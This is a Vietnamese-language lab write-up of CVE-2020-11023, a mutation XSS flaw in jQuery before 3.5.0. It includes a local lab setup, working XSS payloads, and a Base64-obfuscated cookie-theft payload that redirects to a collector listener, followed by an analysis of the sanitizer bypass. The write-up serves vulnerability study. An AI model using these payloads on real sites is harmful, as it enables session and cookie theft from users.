## CVE‑2020‑11023 – jQuery DOM‑based XSS (Mutation XSS)
1 Tổng quan lỗ hổng

- CVE ID: CVE‑2020‑11023

- Thành phần ảnh hưởng: jQuery

- Phiên bản bị ảnh hưởng: jQuery từ 1.0.3 đến trước 3.5.0

- Loại lỗ hổng: DOM‑based XSS

- Mô tả: Trong các phiên bản jQuery nói trên, việc truyền HTML từ nguồn không tin cậy (kể cả đã qua “sanitize” thủ công) vào các phương thức thao tác DOM như: .html(), .append(), .before(), .after(),...  có thể dẫn đến thực thi JavaScript tùy ý. Nguyên nhân là do HTML prefilter của jQuery tự động biến đổi (mutate) HTML đầu vào trước khi chèn vào DOM, khiến các payload XSS vốn “không chạy” ban đầu được kích hoạt sau khi jQuery xử lý. Lỗi này đã được vá trong jQuery 3.5.0.

2 Build lab (môi trường thử nghiệm)
- Chuẩn bị: XAMPP, jQuery phiên bản < 3.5.0 (ví dụ: 3.4.1)

<img width="1498" height="256" alt="image" src="https://github.com/user-attachments/assets/69e36d43-6ba9-40f6-955c-d763ac493cc3" />

3 Demo khai thác (Exploit)

- Payload (URL‑encoded): `/><img src=x onerror=alert(1)>`

- Truy cập: http://127.0.0.1/?value=/%3E%3Cimg%20src=x%20onerror=alert(1)%3E

- Khai thác:

1. Truy cập URL http://127.0.0.1/?value=/%3E%3Cimg%20src=x%20onerror=alert(1)%3E

<img width="829" height="281" alt="image" src="https://github.com/user-attachments/assets/5e738b1c-dfc8-4ede-a5cb-6b3eebcac381" />

2. Nhấn nút “Append via .html()”

3. Hộp thoại alert(1) xuất hiện

<img width="740" height="613" alt="image" src="https://github.com/user-attachments/assets/183b0c7c-8142-4f9d-9de5-f0f2ddbd1368" />

- Đánh cắp cookie (Proof of Impact)

B1: Khởi động server nhận dữ liệu `python -m http.server 8085`

<img width="511" height="39" alt="image" src="https://github.com/user-attachments/assets/decfb2f3-e4b4-4e5e-8cd4-6969ab2a0812" />

B2: Payload `/><img src=x onerror=eval(atob('ZG9jdW1lbnQubG9jYXRpb249Imh0dHA6Ly8xMjcuMC4wLjE6ODA4NS8/Yz0iK2RvY3VtZW50LmNvb2tpZQ=='))>`

Giải mã Base64: document.location="http://127.0.0.1:8085/?c="+document.cookie

URL đầy đủ: http://127.0.0.1/?value=/%3E%3Cimg%20src=x%20onerror=eval(atob(%27ZG9jdW1lbnQubG9jYXRpb249Imh0dHA6Ly8xMjcuMC4wLjE6ODA4NS8/Yz0iK2RvY3VtZW50LmNvb2tpZQ==%27))%3E

B3: Nhấn nút “Append via .html()”, trên terminal Python sẽ thấy request chứa cookie

<img width="764" height="170" alt="image" src="https://github.com/user-attachments/assets/9825437e-6fdb-42c8-8792-f301def321e1" />

4 Phân tích

- Lỗi xuất phát từ cách jQuery (< 3.5.0) xử lý HTML đầu vào khi sử dụng các hàm thao tác DOM. jQuery không chèn trực tiếp chuỗi HTML vào DOM, mà thực hiện một bước trung gian gọi là HTML prefilter, trong đó: Phân tích (parse) HTML đầu vào; Tự động đóng thẻ chưa hoàn chỉnh, sắp xếp lại cấu trúc DOM, di chuyển hoặc tái tạo các node và attribute.

- Payload sử dụng trong lab ban đầu “không chạy” nhưng lại chạy sau khi qua jQuery `/><img src=x onerror=alert(1)>` vì:

1. Payload này được browser parse trong một số ngữ cảnh HTML nhất định: Thẻ <img> có thể không được tạo đúng như mong đợi hoặc payload bị vô hiệu hóa do cấu trúc HTML chưa hợp lệ nên JavaScript không thực thi ngay.

2. Khi payload đi qua jQuery .html(), quy trình bên trong jQuery (< 3.5.0): Chuỗi HTML được đưa vào HTML prefilter; jQuery tự động sửa HTML “lỗi” -> chuẩn hóa cấu trúc DOM -> thẻ <img> được tạo thành một DOM node hợp lệ -> thuộc tính onerror được gắn đúng cách -> trình duyệt tải src=x (không tồn tại) -> sự kiện onerror được kích hoạt -> JavaScript được thực thi

3. Sanitize thủ công vẫn không an toàn vì nhiều ứng dụng thực tế áp dụng các biện pháp như: Loại bỏ <script>, escape một số ký tự nguy hiểm, chỉ lọc dựa trên regex, tuy nhiên với CVE‑2020‑11023: Payload không cần <script>, event handler (onerror) được kích hoạt sau khi DOM bị mutate, sanitizer hoạt động trước jQuery, còn jQuery lại thay đổi DOM sau đó -> Sanitizer bị bypass gián tiếp.

4. Khi khai thác thành công, attacker có thể: Thực thi JavaScript tùy ý trong context của nạn nhân, đánh cắp cookie, session, lấy CSRF token, thực hiện hành vi thay mặt người dùng.
